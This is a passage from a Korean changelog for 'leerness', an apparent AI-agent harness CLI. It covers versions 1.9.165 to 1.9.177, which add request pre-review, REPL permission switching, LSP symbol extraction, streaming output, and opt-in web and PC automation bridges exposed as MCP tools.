- 헤더 1줄: `type=X · ⚠ N 충돌 · 🔁 N 재사용 후보 · ✓ 진행 안전 / ⚠ 확인 필요 (ms)`
- 권장 단계 첫 2건 (나머지는 `leerness review-request` 직접 호출 안내)
- 효율 제안 1건 (가장 중요한 hint)
- `proceed=false` 시 ⚠ 사유 노출

### MCP 호환성
`leerness_task_add` (MCP) 호출 시에도 자동 review 동작 — 외부 AI (Claude/Codex/Gemini)가 task 등록 시 자동으로 사전 검토 결과 받음.

### 성능
실측: ~1.1초 task add (이전 ~30ms + review 1초 추가). brainstorm/reuse-map 회수 비용 — opt-out 가능.

### Verified
- e2e 217/217 baseline 유지
- stress-v122: **18/18** (taskAdd 통합 4 + 실 동작 7 + MCP 호환 1 + 누적 회귀 6)
- VERSION = 1.9.177 / autonomous-rounds = 107 / main 자동 push 38 라운드 연속

---

## 1.9.176 — 2026-05-21

**⚠ 사용자 명시: `leerness review-request` — 사용자 요구를 무조건 구현 전 사전 검토.**

사용자 명시: *"leerness가 적용된 프로젝트는 사용자의 요구를 무조건적으로 구현하기 전에, 충돌이 발생할 수 있는 부분이나 제작하고자 하는 기능 등을 구현하거나 설계할 때 더 효율적인 단계가 있는지 검토해보고 제시할 수도 있도록 설계"*.

### `leerness review-request "<request>"` — 9개 신호 분석
| 신호 | 데이터 소스 |
|---|---|
| **estimatedType** | route 키워드 매핑 (feature/bugfix/refactor/research/planning/release/consistency) |
| **conflicts** | lessons 실패 패턴 + 진행 중 task + taskLogFails |
| **reuseCandidates** | skills 매칭 + reuse-map 키워드 검색 |
| **lessonsRecall** | 과거 decisions + 관련 lessons |
| **planConflicts** | 진행 중 milestone (plan.md) |
| **featureConflicts** | feature_graph.md 영역 겹침 |
| **recommendedSteps** | 작업 유형별 3-4단계 권장 흐름 |
| **efficiencyHints** | 재사용/sub-agent/skill 활용 제안 |
| **proceed** | true (안전) / false (사용자 확인 필요) |

### 사용 예
```bash
$ leerness review-request "OAuth 로그인 구현해줘"
# leerness review-request (1.9.176 사전 검토)
요청: "OAuth 로그인 구현해줘"
추정 작업 유형: feature

## 💡 효율 제안
  👥 leerness agents recommend feature — 작업 유형별 sub-agent 매핑 활용 가능

## 📍 권장 단계 (feature)
  1) leerness reuse find "<핵심 capability>" — 중복 구현 사전 차단
  2) leerness plan add "<milestone>" — 진행 추적
  3) leerness contract verify SPEC.md src/<mod>.js — 사양 ↔ 구현 일치 검증
  4) verify-claim --run-tests 로 evidence 의무화

## ▶ 진행 권장: ✓ 진행 안전
   사유: 안전 — 충돌 신호 < 3 + plan 충돌 0
   분석 소요: 938ms
```

### 통합 — 3 진입점
- **CLI**: `leerness review-request "<request>"` (또는 단축 `review-req`)
- **REPL**: `:review "<request>"` slash (1.9.175 흐름 연장)
- **MCP**: `leerness_review_request` (외부 AI 직접 호출 — **54번째 도구**)

### AGENTS.md / CLAUDE.md 강제 안내
```markdown
## ⚠ 사용자 요청 사전 검토 의무 (1.9.176 — 사용자 명시)
**사용자가 "X 구현해줘 / X 만들어줘 / X 추가해줘" 같은 요청을 줬을 때 무조건 즉시 구현하지 말 것.**
먼저 `leerness review-request "<요청>"` 호출 → 분석 결과 표시 → 사용자 확인 후 구현.
"그냥 바로 해줘 / review 건너뛰어줘" 명시 옵트아웃 시에만 review 생략.
```

### Verified
- e2e 217/217 baseline 유지
- stress-v121: **23/23** (함수 정의 4 + router/help 2 + 실 동작 6 + REPL/MCP 3 + metadata 2 + 누적 회귀 6)
- 작업 유형 추정 정확도: feature/bugfix/refactor/research 4종 100% 매칭
- VERSION = 1.9.176 · MCP **54 도구** · autonomous-rounds = 106 · main 자동 push 37 라운드 연속

---

## 1.9.175 — 2026-05-21

**🌉 REPL Bridge Slash 3종 — `:web` / `:pc` / `:lsp` 즉시 호출.**

자율 모드 105 라운드. 1.9.165~167 Bridge 3종이 1.9.168 MCP로 외부 AI 직접 호출 가능. **1.9.175: REPL 안에서도 직접 호출 가능** — 사용자 + AI 가 같은 REPL 세션에서 코드 분석/웹/PC 자동화 즉시 사용.

### 사용 예시
```
agent[claude/actor/▶]> :lsp symbols src/api.ts
  → leerness lsp symbols src/api.ts
# leerness lsp symbols (1.9.173 다국어)
file: src/api.ts  · lang: javascript
mode: typescript-compiler · 24 symbols · 12ms
      3:function   parseRequest
      8:class      User
     ...
  ✓ :lsp symbols 완료 (132ms)

agent[claude/actor/▶]> :web screenshot https://example.com --out shot.png
  → leerness web screenshot https://example.com --out shot.png
✓ screenshot saved: shot.png · 1842ms
  ✓ :web screenshot 완료 (2014ms)

agent[claude/actor/▶]> :pc click 800 400
  ⚠ :pc click 은 permissions=full 필요 (현재: basic)
     :permissions full  로 즉시 변경 가능 (1.9.174)

agent[claude/actor/▶]> :permissions full
  ✓ 권한 모드 변경: full
agent[claude/actor/▶]> :pc click 800 400
  ✓ click (800, 400) — 23ms
  ✓ :pc click 완료 (35ms)
```

### 통합 흐름 — 사용자 명시 4 라운드 누적
| 라운드 | 강화 |
|---|---|
| 1.9.170 | Tab/Shift+Tab cycle + 실시간 스트리밍 |
| 1.9.172 | 스트리밍 spinner + tool_use + diff 색깔 |
| 1.9.174 | install 권한 prompt 제거 + REPL `:permissions` 변경 |
| **1.9.175** | **REPL `:web` / `:pc` / `:lsp` slash 3종 즉시 호출** |

→ **REPL 안에서 leerness 의 모든 capability 사용 가능** (AI 대화 + 코드 분석 + 웹 + PC + 권한 변경, 한 세션).

### 위험 sub 사전 권한 검사
`:pc click/type/screenshot` 시 `permissions !== 'full'` 이면 즉시 경고 + 변경 안내 (1.9.174 `:permissions full` 연동).

### 구현
- `op === 'web' || op === 'pc' || op === 'lsp'` 핸들러 추가 (Memory slash 분기 직전)
- `subParts = rest.length ? rest : ['check']` (인자 없으면 check 기본)
- `runCommandSafe(process.execPath, [__filename, ...cliArgs, '--path', root], ...)` 통합 호출
- observability: `kind: 'agent_repl_slash'`, `label: 'repl-<op>'`
- stdout 50줄 까지 표시 (Memory slash 30줄보다 확장 — symbol/diff 출력 용도)

### Verified
- e2e 217/217 baseline 유지
- stress-v120: **17/17** (slash 핸들러 4 + :pc 권한 사전 검사 2 + :help/환영 5 + 누적 회귀 6)
- VERSION = 1.9.175 / autonomous-rounds = 105 / main 자동 push 36 라운드 연속

---

## 1.9.174 — 2026-05-21

**🔐 사용자 명시 — install 권한 prompt 제거 + REPL `:permissions` 즉시 변경.**

자율 모드 104 라운드. 사용자 명시: *"권한 설정 문항은 제거하고 REPL 모드에서 간편하게 권한 변경할 수 있도록"*.

### 1. Install 권한 prompt 제거
이전 (1.9.146): install 시 3-tier 권한 모드 선택 prompt (basic/extended/full).
**문제**: 사용자 경험 복잡도 증가 + 잘못된 선택 (full) 시 위험.

**1.9.174**:
- install 시 권한 **항상 `basic` 자동 적용** (안전 default).
- prompt 코드 (resolveInstallOptions 안 권한 모드 _selectOne 블록) 완전 제거.
- 안내 라인: `Agent 권한 모드: basic (1.9.174 — REPL에서 :permissions extended|full 로 즉시 변경 가능)`.

### 2. REPL `:permissions` 즉시 변경 가능
이전 (1.9.146~1.9.173): `:permissions` 메타 명령은 list 만 (조회).

**1.9.174**:
```
agent[claude/actor/▶]> :permissions
  🔐 현재 권한 모드: basic

  변경:
    :permissions basic     — 안전 (.harness 만 쓰기, 권장)
    :permissions extended  — 프로젝트 폴더 + shell allowlist
    :permissions full      — ⚠ 전체 (마우스/키보드/웹, IDE 통합 시만)

  세부 권한 (mouse/keyboard/browser/admin):
    mouse: ✗ 거부
    keyboard: ✗ 거부
    browser: ✗ 거부
    admin: ✗ 거부

agent[claude/actor/▶]> :permissions extended
  ✓ 권한 모드 변경: extended  (즉시 적용 — 다음 명령부터)

agent[claude/actor/▶]> :permissions full
  ✓ 권한 모드 변경: full  (즉시 적용 — 다음 명령부터)
  ⚠ full 모드 — 마우스/키보드/웹/관리자 전체 허용. IDE 통합 외 환경에서는 위험.
```

- 인자 없음 → 현재 모드 + 세부 권한 (mouse/keyboard/browser/admin) 표시 + 변경 옵션 안내
- `:permissions basic|extended|full` → 즉시 변경 (`permissionsSetCmd` 호출)
- `:perm` alias 추가 (단축)
- `full` 모드 변경 시 ⚠ 명시적 경고
- 잘못된 모드 → 친절한 안내 (`잘못된 모드: xyz (basic | extended | full)`)

### 호환성
- CLI 명령 `leerness permissions list|set` 그대로 유지 (1.9.146 호환).
- 기존 `.harness/agent-permissions.json` 형식 그대로 (mode + 4-tier 세부).

### Verified
- e2e 217/217 baseline 유지
- stress-v119: **20/20** (install 제거 5 + REPL :permissions 7 + CLI 호환 2 + 누적 회귀 6)
- VERSION = 1.9.174 / autonomous-rounds = 104 / main 자동 push 35 라운드 연속

---

## 1.9.173 — 2026-05-21

**🌐 LSP 어댑터 다국어 확장 — JavaScript + Python + Go + Rust + Java (5개 언어 regex fallback).**

자율 모드 103 라운드. 1.9.167 codeIntel (JS/TS only) → 5개 언어 확장.

### `_LSP_LANG_PATTERNS` — 5개 언어 패턴
| 언어 | 추출 가능 |
|---|---|
| **javascript** (.ts/.tsx/.js/.jsx/.mjs/.cjs) | function, class, interface, type, enum, arrow function |
| **python** (.py/.pyw/.pyi) | def, async def, class |
| **go** (.go) | func (receiver 포함), type struct/interface, type alias |
| **rust** (.rs) | fn (pub/async), struct, enum, trait, impl, type |
| **java** (.java/.kt/.scala) | class (public/private/abstract), interface, enum, method |

### `_detectLspLang(file)` — 확장자 자동 라우팅
파일 확장자 기반 언어 자동 감지. 미지원 확장자는 javascript 기본 (1.9.167 호환).

### 사용 예시
```bash
$ leerness lsp symbols src/api.py
# leerness lsp symbols (1.9.173 다국어)
file: src/api.py  · lang: python
mode: regex-fallback (python) · 12 symbols · 4ms
      1:function   parse_request
      8:function   fetch_data
     15:class      Handler
     16:function   __init__
     ...

$ leerness lsp symbols src/main.rs
# leerness lsp symbols (1.9.173 다국어)
file: src/main.rs  · lang: rust
mode: regex-fallback (rust) · 9 symbols · 5ms
      1:function   hello
      5:struct     User
      9:impl       User
     15:trait      Greeter
     ...
```

### 키워드 false-positive 제거
Java method 정규식이 `if(`, `for(`, `while(`, `switch(`, `catch(`, `return(`, `throw(`, `new(` 등 키워드에 매치되는 경우 필터.

### references 다국어 파일 스캔
`leerness lsp references <name>` 가 `.py/.go/.rs/.java/.kt/.scala` 파일도 스캔 (기존 `.ts/.js/.md` 에 추가).

### 실측 (regex fallback)
- Python (5 symbols): 472ms
- Go (4 symbols): 566ms
- Rust (6 symbols): 531ms
- Java (4 symbols): 1229ms

### Verified
- e2e 217/217 baseline 유지
- stress-v118: **15/15** (패턴 정의 4 + Python 1 + Go 1 + Rust 1 + Java 1 + JS 호환 1 + references 1 + 누적 회귀 5)
- VERSION = 1.9.173 / autonomous-rounds = 103 / main 자동 push 34 라운드 연속

---

## 1.9.172 — 2026-05-21

**🎨 스트리밍 UX 강화 — spinner + Claude tool_use 가시화 + diff 패턴 자동 색깔 (사용자 명시 강화).**

자율 모드 102 라운드. 1.9.170 사용자 명시 ("터미널 화면 계속 갱신, 추론중/diff/생각하는 과정 실시간 표시") 의 진짜 의도 보강.

### 1. 추론중 Spinner — Visual Feedback
- `_cliChatStream` 안에 `setInterval(120ms)` spinner — stdout idle 800ms+ 시 깜빡임
- `⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏` 10 frames + 경과 시간 표시 ("⠙ 추론중... (3s)")
- `\r\x1b[K` ANSI escape — 현재 라인 클리어 + spinner 갱신
- `stopSpinner()` — stdout/stderr data 도착 시 즉시 spinner 라인 클리어
- 옵션: `opts.noSpinner: true` 또는 비-TTY 환경에선 자동 비활성

### 2. Claude tool_use 가시화
- Claude `--output-format=stream-json` 의 `content_block_start` 이벤트에서 `type='tool_use'` 감지
- 표시: `🔧 Tool: Read 호출 중...` (cyan 색)
- AI가 파일 읽기/쓰기/Bash 호출 시 사용자가 즉시 인지

### 3. diff 패턴 자동 색깔 (writeColored)
```diff
diff --git a/file.js b/file.js    # yellow (헤더)
--- a/file.js                       # yellow
+++ b/file.js                       # yellow
@@ -10,3 +10,3 @@                  # cyan (hunk)
- old line                          # red
+ new line                          # green
  context                           # 기본 색
```
- 라인 단위 처리 (`lineBuf` 버퍼링)
- 정규식 매칭: `/^\+(?!\+\+)/` → green, `/^-(?!--)/` → red, `/^@@.*@@/` → cyan
- `flushLineBuf()` — 종료 시 잔여 라인 출력

### 통합 흐름
```
user> 이 함수 리팩토링 + diff 보여줘
  → claude CLI stream 호출 중...  (Ctrl+C 로 중단)
  ── claude stream ──
⠹ 추론중... (2s)                   # 응답 시작 전 spinner
  [claude-opus-4-7]
  🔧 Tool: Read 호출 중...          # tool_use 감지
  
  분석 결과:
  
  diff --git a/utils.js b/utils.js  # yellow
  @@ -5,3 +5,3 @@                   # cyan
  - function bad() { return null; } # red
  + function good() { return {}; }  # green
  ── /stream (4521ms) ──
```

### Verified
- e2e 217/217 baseline 유지
- stress-v117: **20/20** (spinner 4 + tool_use 2 + diff 4 + ANSI helpers 2 + 통합 2 + 누적 회귀 6)
- VERSION = 1.9.172 / autonomous-rounds = 102 / main 자동 push 33 라운드 연속

---

## 1.9.171 — 2026-05-21

**AGENTS.md / CLAUDE.md / session-workflow.md 1.9.88~170 누적 갱신 (drift 차단).**

자율 모드 101 라운드. 1.9.87 마지막 metadata 갱신 후 84 라운드 간격 — 다음 세션에서 새 기능 (REPL/Bridge/Tab cycle/53 MCP/6 능력) 인지 못 할 위험 차단.

### Updated
- **session-workflow.md**: 1.9.140~170 31 라운드 누적 변경사항 추가
  - release sync-main 자동 (31 라운드 연속 main 자동 push)
  - Feature Causality Graph (1.9.141~143)
  - env detect (1.9.145)
  - CLI 에이전트 모드 + 3-tier 권한 시스템 (1.9.146)
  - REPL agent + Sandboxing runCommandSafe (1.9.149~150)
  - REPL UX 강화 (1.9.151~155)
  - agents multi --execute + consensus (1.9.156)
  - Provider Registry CRUD CLI + MCP **50 도구 마일스톤** (1.9.157~159)
  - 90 라운드 마일스톤 (1.9.160)
  - REPL slash 4종 (1.9.161~162)
  - 5능력 매트릭스 health 통합 (1.9.163)
  - leerness which 진단 (1.9.164)
  - web/pc/lsp bridge 3종 (1.9.165~167)
  - MCP **53 도구 마일스톤** + Bridge 외부 노출 (1.9.168)
  - --include explicit-only hotfix (1.9.169)
  - **100 라운드 + Tab cycle + 실시간 스트리밍** (1.9.170)

- **AGENTS.md**: 
  - "REPL Agent + Bridge 명령 (1.9.149~170)" 섹션 신설 (자연어 매핑 11종)
  - "6 능력 매트릭스 (1.9.167+)" 섹션 — overallScore + production-ready/beta-ready/mvp 라벨

- **CLAUDE.md**: 
  - REPL Agent 100 라운드 자율 마일스톤 섹션 (Tab/Shift+Tab/스트리밍)
  - Bridge 3종 opt-in 안내
  - 6 능력 매트릭스 72% production-ready

### 자연어 매핑 신규 추가 (AGENTS.md)
| 사용자 발화 | 즉시 실행 |
|---|---|
| "에이전트 켜줘 / REPL 모드" | `leerness agent .` |
| "Claude/Codex 대화" | `leerness agent . --provider claude` |
| "다른 provider / Tab" | REPL에서 `Tab` / `Shift+Tab` |
| "웹 스크린샷 / URL 캡처" | `leerness web screenshot <url>` |
| "마우스 클릭 / 자동화" | `leerness pc click <x> <y>` |
| "함수 찾아줘 / 심볼 추출" | `leerness lsp symbols <file>` |
| "참조 검색" | `leerness lsp references <name> --in <dir>` |
| "권한 모드 확인" | `leerness permissions list` |
| "최신 버전 작동 확인" | `leerness which` |

### Verified
- e2e 217/217 baseline 유지
- stress-v116: **20/20** (session-workflow 6 + AGENTS 4 + CLAUDE 3 + 누적 회귀 7)
- VERSION = 1.9.171 / autonomous-rounds = 101 / main 자동 push 32 라운드 연속

---

## 1.9.170 — 2026-05-21 — 🎉 100 라운드 자율 마일스톤

**사용자 명시 요청 2종: REPL Tab cycle provider/model + 실시간 스트리밍.**

자율 모드 100 라운드 도달 (1.9.71~1.9.170). 사용자 직접 요청 2종 통합:
1. **Tab 키 cycle** — provider/model 빠른 전환
2. **실시간 스트리밍** — 추론중/diff/thinking 과정 즉시 표시

### 1. REPL Tab cycle (사용자 명시 — "탭 키 등으로 provider/모델 셀렉과 선택 간편하게")

```
agent[claude/actor/▶]> [Tab]              # → ollama로 cycle
agent[ollama/actor/▶]> [Tab]              # → claude로 cycle
agent[claude/actor/▶]> [Shift+Tab]        # → 현재 provider의 다음 model로
  ⇄ model: claude-opus-4-7  — 최신 1M context (Anthropic Opus 4.7)
```

**구현**:
- `readline.emitKeypressEvents(process.stdin, rl)` — Tab 키 감지 활성화
- `process.stdin.on('keypress', ...)` — Tab/Shift+Tab 가로채서 cycle 실행
- `getProviders()` — 빌트인 5종 + `.harness/providers.json` 사용자 정의 통합
- prompt 갱신: `agent[provider/role/▶]>` (스트리밍 ON 시 ▶ 표시)

### 2. 실제 모델 catalog 확장 (사용자 명시 — "gpt-5.5, gpt-5.4, claude opus4.7 등 실제 모델")

| Provider | 모델 |
|---|---|
| **claude** | **claude-opus-4-7** (1M context), opus-4-5, sonnet-4-7, sonnet-4-5, haiku-4-5 |
| **codex** | **gpt-5.5** (최신 추론), gpt-5.4, gpt-5, gpt-5-codex, o4-mini |
| **gemini** | gemini-2.5-pro, gemini-2.5-flash, gemini-3.0-pro |
| ollama | llama3, qwen2.5-coder, gpt-oss, deepseek-coder-v2 |
| copilot | default |

### 3. 실시간 스트리밍 (사용자 명시 — "추론중, diff, 생각하는 과정 실시간 표시")

```
user> 이 함수 리팩토링 해줘
  → claude CLI stream 호출 중...  (Ctrl+C 로 중단)
  ── claude stream ──
  [claude-opus-4-7] 분석 중...
  function refactored() {
    // 실시간으로 한 글자씩 흘러나옴
    ...
  }
  ── /stream (3421ms) ──
  [assistant: claude/claude-opus-4-7, role=actor, 3421ms · 1248자]
```

**구현**:
- `_cliChatStream()` — `cp.spawn(..., { stdio: ['ignore', 'pipe', 'pipe'] })`
- Claude: `--output-format=stream-json --verbose` 활용 → `content_block_delta` / `thinking_delta` 파싱
- 다른 provider (codex/gemini/copilot): stdout raw pipe
- env scrub + cwd jail 유지 (1.9.150 sandboxing 호환)
- observability: `_recordRun(kind: 'agent_repl_cli_stream')`
- `:stream on|off` 토글, default ON (env `LEERNESS_REPL_STREAM=0` 로 끄기)

### 100 라운드 마일스톤
| 마일스톤 | 라운드 | 도구 |
|---|---|---|
| MCP 30 도구 | 1.9.110 | Memory CRUD 완성 |
| MCP 50 도구 | 1.9.159 | Provider Registry CRUD |
| 90 라운드 | 1.9.160 | provider sync |
| MCP 53 도구 | 1.9.168 | Bridge 3종 외부 노출 |
| **100 라운드** | **1.9.170** | **🎉 Tab cycle + 실시간 스트리밍** |

### Verified
- e2e 217/217 baseline 유지 (1.9.169 hotfix 후)
- stress-v115: **23/23** (catalog 4 + Tab cycle 3 + 스트리밍 4 + :stream + REPL 통합 5 + 누적 회귀 7)
- VERSION = 1.9.170 / autonomous-rounds = **100** 🎉 / main 자동 push 31 라운드 연속

---

## 1.9.169 — 2026-05-20

**🔧 Hotfix — `_collectWorkspacePaths()` --include 명시 시 cwd 자동 추가 안 함.**

자율 모드 99 라운드. 1.9.168 release 후 발견된 e2e flake (209/217) 의 영구 해결.

### 문제 진단
- `cwd: os.tmpdir()` 명령 실행 시 leerness가 cwd의 `.harness` 자동 발견 → 카운트 +1
- `os.tmpdir()` 에 잔존 `.harness` 디렉토리 존재 시 `--include` 명시했어도 cwd 추가됨
- 결과: `brainstorm --include p1,p2` 호출 시 "3개 프로젝트" (cwd + p1 + p2) 잘못 카운트
- 1.9.168 회귀 아님 — 1.9.15 이래 누적된 잠재 버그 (환경 의존 flake)
- 24,877개 누적 leerness-* 임시 디렉토리 + 잔존 `Temp/.harness` 가 트리거

### Fix — _collectWorkspacePaths() (harness.js, 1.9.15 도입 함수)
```javascript
function _collectWorkspacePaths(rootBase) {
  const set = new Set();
  const include = arg('--include', null);
  // 1.9.169 fix: --include 명시 시 cwd 자동 추가 스킵 (explicit-only)
  if (!include) {
    if (exists(path.join(rootBase, '.harness'))) set.add(rootBase);
  }
  // ... --all-apps 동작 유지
  if (include) { /* explicit paths only */ }
  return Array.from(set);
}
```

**원칙**: `--include` 가 명시되면 사용자가 의도한 explicit 경로만 사용. `--all-apps` 단독 또는 인자 없는 경우 기존 동작 (cwd 자동 추가) 유지.

### 영향 범위
- `brainstorm --include`, `insights --include`, `handoff --include`, `reuse-map --include`, `retro --include`
- 모든 `--include` / 다중 프로젝트 명령 정확한 카운트

### Verified
- e2e **217/217 ✓** (1.9.168 시점 209/217 → 1.9.169 217/217 회복)
- stress-v114: 14/14 (hotfix 4 + e2e 회복 3 + 누적 회귀 7)
- 진단 검증: `os.tmpdir()/.harness` 시뮬 환경에서도 정확 카운트
- VERSION = 1.9.169 / autonomous-rounds = 99 / main 자동 push 30 라운드 연속

### 다음 라운드 (1.9.170) — 🎉 100 라운드 마일스톤 도달

---

## 1.9.168 — 2026-05-20

**MCP bridge 3종 노출 (web/pc/lsp) — 50 → 53 도구 + 외부 AI 자동화 능력 직결.**

자율 모드 98 라운드. 1.9.165~167 에서 leerness CLI 에 추가한 web/pc/lsp bridge 3종을 MCP 도구로 노출 → 외부 AI (Claude, Codex, Gemini, Copilot)가 leerness 의 웹/PC/LSP 자동화 능력을 **직접 호출** 가능.

### Added — MCP 도구 3종
| 도구 | 라우팅 | 설명 |
|---|---|---|
| `leerness_web` | `web check\|screenshot\|extract` | 1.9.165 playwright bridge MCP 노출 |
| `leerness_pc` | `pc check\|click\|type\|screenshot` | 1.9.166 robotjs/nut-tree bridge MCP 노출 |
| `leerness_lsp` | `lsp check\|symbols\|references` | 1.9.167 LSP 어댑터 MCP 노출 (typescript opt-in + regex fallback) |

### 멀티 에이전트 오케스트레이션 강화
1.9.156 `agents multi --execute` (실제 spawn + multi-signal consensus) 와 결합하면:
- 외부 AI 1 (Claude) → `leerness_web screenshot` (검수 자료 캡처)
- 외부 AI 2 (Codex) → `leerness_lsp symbols` (코드 인텔리전스)
- 외부 AI 3 (Gemini) → `leerness_pc screenshot` (UI 테스트 자동화)

→ **leerness 가 모든 외부 AI의 도구 공급망 역할** (= 진정한 범용 AI 하네스).

### MCP 53 도구 마일스톤
| 라운드 | 도구 수 | 마일스톤 |
|---|---|---|
| 1.9.110 | 30 | Memory CRUD 5종 완성 |
| 1.9.159 | 50 | Provider Registry CRUD 완성 |
| **1.9.168** | **53** | **Bridge 3종 외부 노출 (web/pc/lsp)** |

### 사용 예시 (MCP tools/call)
```json
{ "name": "leerness_lsp", "arguments": { "sub": "symbols", "file": "src/api.ts" } }
{ "name": "leerness_web", "arguments": { "sub": "screenshot", "url": "https://example.com", "out": "shot.png" } }
{ "name": "leerness_pc", "arguments": { "sub": "click", "x": 800, "y": 400 } }
```

### Verified
- e2e 217/217 baseline (1.9.167 유지)
- stress-v113: 17/17 (MCP 등록 4 + tools/call 실 동작 4 + 6능력 매트릭스 2 + 누적 회귀 7)
- 실측: `leerness_lsp symbols harness.js` (MCP) → 472 symbols
- VERSION = 1.9.168 / autonomous-rounds = 98 / main 자동 push 29 라운드 연속

### 6능력 매트릭스 (영향 없음, 100 라운드 마일스톤 임박)
| 영역 | 1.9.167 | **1.9.168** |
|---|---|---|
| (5) MCP 도구 | 100% (50+ 50 도구) | **100% (53 도구)** |
| 종합 | 72% | **72%** (production-ready 유지) |

다음 라운드 (1.9.169~170): 100 라운드 마일스톤 임박 (2 라운드 남음).

---

## 1.9.167 — 2026-05-20

**LSP 어댑터 MVP — codeIntel 6번째 영역 신설 (typescript opt-in + regex fallback).**

자율 모드 97 라운드. 1.9.165 (web) + 1.9.166 (pc) 흐름에 이어 코드 인텔리전스 신규 영역 추가.
5능력 매트릭스 → **6능력 매트릭스**로 확장 (제 6번 codeIntel 영역 신설).

### Added — `leerness lsp check|symbols|references`
**의존성 0 원칙 유지** — `typescript` 미설치 시 정규식 fallback 으로도 동작 (항상 사용 가능).

```bash
# 1) typescript 설치 (정확 모드 = Compiler API)
npm i -g typescript
leerness lsp check                          # → ✓ typescript 발견 (Compiler API)

# 미설치 시 정규식 fallback 자동 사용 (TS/JS 한정)
leerness lsp check                          # → ⚠ typescript 미설치 → regex fallback

# 2) 심볼 추출
leerness lsp symbols src/api.ts             # → function/class/interface/type/enum
leerness lsp symbols src/api.ts --json      # 구조화 출력 (line, kind, name)

# 3) 참조 검색
leerness lsp references myFunction --in src # → 모든 호출 위치 (file:line)
```

### Bridge 패턴 — opt-in 의존성 + 정규식 fallback (이중 안전망)
- `_tryLoadLSP()` — `typescript` (Compiler API) try + npm 글로벌 root 폴백
- 미설치 시 → `_lspRegexSymbols()` 정규식 fallback (function/class/interface/type/enum/arrow function)
- 설치 시 → `_lspTsSymbols()` TypeScript Compiler API 정확 모드 (AST 기반)
- `_recordRun(kind: 'lsp_symbols' | 'lsp_references')` observability

### 6능력 매트릭스 (신규 영역 신설 + production-ready 유지)
| 영역 | 1.9.166 | **1.9.167** |
|---|---|---|
| (1) 웹 자동화 | 50% ⚠ | 50% ⚠ |
| (2) PC 조작 | 50% ⚠ | 50% ⚠ |
| (3) 멀티 오케스트레이션 | 90% ✓ | 90% ✓ |
| (4) REPL/자율성 | 90% ✓ | 90% ✓ |
| (5) MCP 도구 | 100% ✓ | 100% ✓ |
| (6) **코드 인텔리전스** | **— (없음)** | **50% ⚠** (bridge, typescript 미설치) → **90% ✓** (사용자 설치 시) |
| **종합** | 76% (5 영역 평균) | **72%** (6 영역 평균, production-ready 유지) |

**평가**: 종합 점수는 영역 추가로 일시적으로 76→72% 로 떨어졌으나 production-ready (≥70%) 유지. 새 영역 codeIntel 이 90% 도달 시 종합 75%.

### Verified
- e2e baseline (1.9.166: 217/217) 유지 회귀 없음
- stress-v112: 23/23 (LSP 함수 6 + CLI 실 동작 7 + 6능력 매트릭스 3 + 누적 회귀 7)
- VERSION = 1.9.167 / autonomous-rounds = 97 / main 자동 push 28 라운드 연속

### 실 측정 (regex fallback 모드)
- `lsp symbols harness.js` (12,000+ lines) → 472 symbols / 392ms
- `lsp references lspCmd --in leerness-pkg` → 3 refs / 9ms

---

## 1.9.166 — 2026-05-20

**🎉 production-ready 76% 마일스톤 — pc 조작 bridge MVP (robotjs/nut-tree opt-in).**

자율 모드 96 라운드. 1.9.163 5능력 매트릭스에서 두 번째로 낮은 영역 (PC 조작 5%) 직접 보강.
1.9.165 (web 67%) 에 이어 2 라운드 연속 5능력 직접 보강 → **종합 67% → 76% production-ready 첫 진입.**

### Added — `leerness pc check|click|type|screenshot`
**의존성 0 원칙 유지** — leerness 자체에는 robotjs/nut-tree 미포함. 사용자가 별도 설치 시 자동 detect.

```bash
# 1) robotjs 또는 @nut-tree/nut-js 설치 (택 1)
npm i -g robotjs                          # 또는
npm i -g @nut-tree/nut-js
leerness permissions set full              # ⚠ mouse/keyboard 권한 필요
leerness pc check                          # → ✓ robotjs 발견

# 2) 클릭 / 타이핑 / 스크린샷
leerness pc click 800 400                  # 좌표 클릭
leerness pc type "Hello, leerness"         # 키보드 입력
leerness pc screenshot --out shot.png      # 스크린샷
```

### Bridge 패턴 — opt-in 의존성
- `_tryLoadPCAutomation()` — `robotjs` (동기) / `@nut-tree/nut-js` (비동기) 둘 다 시도 + npm 글로벌 root 폴백
- 미설치 시 친절한 안내 (`npm i -g robotjs` 또는 `npm i -g @nut-tree/nut-js`)
- `permissionCheck(root, 'mouse'/'keyboard')` 통합 (1.9.146 권한 시스템)
- `_recordRun(kind: 'pc_click' | 'pc_type' | 'pc_screenshot')` observability
- 두 라이브러리 분기: robotjs `moveMouse/mouseClick/typeString` (sync), @nut-tree `mouse.move/leftClick/keyboard.type` (async)

### 5능력 매트릭스 갱신 (🎉 production-ready 첫 진입)
| 영역 | 1.9.165 | **1.9.166** |
|---|---|---|
| (1) 웹 자동화 | 50% ⚠ (bridge) | 50% ⚠ (bridge, playwright 미설치) |
| (2) **PC 조작** | **5% ❌** | **50% ⚠** (bridge MVP, robotjs 미설치) → **90% ✓** (사용자 설치 시) |
| **종합** | 67% (beta-ready) | **76% 🎉 production-ready** |

`leerness health` 가 실시간 detect — `require('robotjs')` 또는 `require('@nut-tree/nut-js')` try 성공 시 90% 자동 부여.

### Verified
- e2e 217/217 ✓ (1.9.165 baseline)
- stress-v111: 20/20 (bridge 함수 6종 + CLI 동작 5종 + 매트릭스 갱신 3종 + 누적 회귀 6종)
- VERSION = 1.9.166 / autonomous-rounds = 96

### main 자동 push 27 라운드 연속
1.9.140~1.9.166 = 27 라운드 release/X.Y.Z + main sync 무중단.

---

## 1.9.165 — 2026-05-20

**playwright bridge MVP — opt-in 웹 자동화 (5능력 #1 보강, 58% → 67%).**

자율 모드 95 라운드. 1.9.163 5능력 매트릭스에서 가장 낮은 영역 (웹 자동화 5%) 직접 보강.

### Added — `leerness web check|screenshot|extract`
**의존성 0 원칙 유지** — leerness 자체에는 playwright 미포함. 사용자가 `npm i -g playwright` 별도 설치 시 자동 detect.

```bash
# 1) playwright 설치 + 사용 가능 확인
npm i -g playwright
npx playwright install chromium
leerness permissions set extended    # 또는 full
leerness web check                    # → ✓ playwright 발견

# 2) 스크린샷
leerness web screenshot https://example.com --out shot.png

# 3) DOM 추출
leerness web extract https://example.com --selector "h1,h2" --json
```

### Bridge 패턴 — opt-in 의존성
- `_tryLoadPlaywright()` — `playwright` / `playwright-core` 둘 다 시도 + npm 글로벌 root 폴백
- 미설치 시 친절한 안내 (`npm i -g playwright`)
- `permissionCheck(root, 'browser')` 통합 (1.9.146 권한 시스템)
- `_recordRun(kind: 'web_screenshot' | 'web_extract')` observability

### 5능력 매트릭스 갱신
| 영역 | 1.9.164 | **1.9.165** |
|---|---|---|
